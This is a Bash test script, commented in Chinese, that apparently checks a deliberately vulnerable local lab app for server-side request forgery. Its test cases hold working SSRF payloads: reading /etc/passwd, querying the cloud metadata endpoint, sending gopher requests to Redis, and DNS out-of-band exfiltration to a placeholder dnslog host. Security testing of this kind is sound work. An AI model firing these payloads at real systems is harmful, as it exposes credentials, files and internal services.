#!/bin/bash
# SSRF 漏洞验证脚本

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASE_URL="http://localhost:8080"
TOTAL=0
PASSED=0
FAILED=0
DNSLOG_DOMAIN="xxx.dnslog.cn"

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}SSRF 漏洞验证脚本${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

test_case() {
    local name="$1"
    local url="$2"
    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[测试 $TOTAL]${NC} $name"
    echo "URL: $url"

    response=$(curl -s "$url" 2>/dev/null)
    if [ $? -eq 0 ]; then
        echo -e "  ${GREEN}[✓] 端点响应${NC}"
        echo "  响应: $(echo "$response" | head -c 100)..."
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}[✗] 请求失败${NC}"
        FAILED=$((FAILED + 1))
    fi
}

echo -e "${BLUE}=== SSRF 测试 ===${NC}"

test_case "本地文件读取" \
    "${BASE_URL}/ssrf/local?url=file:///etc/passwd"

test_case "内网扫描" \
    "${BASE_URL}/ssrf/internal?url=http://localhost:8080"

test_case "云元数据" \
    "${BASE_URL}/ssrf/metadata?url=http://169.254.169.254/latest/meta-data/"

test_case "Redis 命令" \
    "${BASE_URL}/ssrf/redis?url=gopher://localhost:6379/INFO"

test_case "DNS 外带" \
    "${BASE_URL}/ssrf/dns?url=http://${DNSLOG_DOMAIN}"

test_case "SSRF + HTTP" \
    "${BASE_URL}/ssrf/http?url=http://internal.service/admin"

# 信息端点
echo -e "\n${YELLOW}[*] SSRF 信息端点:${NC}"
info=$(curl -s "${BASE_URL}/ssrf/info" 2>/dev/null)
echo "$info" | head -10

# 总结
echo -e "\n${BLUE}========================================${NC}"
echo -e "总测试数: ${YELLOW}$TOTAL${NC}"
echo -e "通过: ${GREEN}$PASSED${NC}"
echo -e "失败: ${RED}$FAILED${NC}"
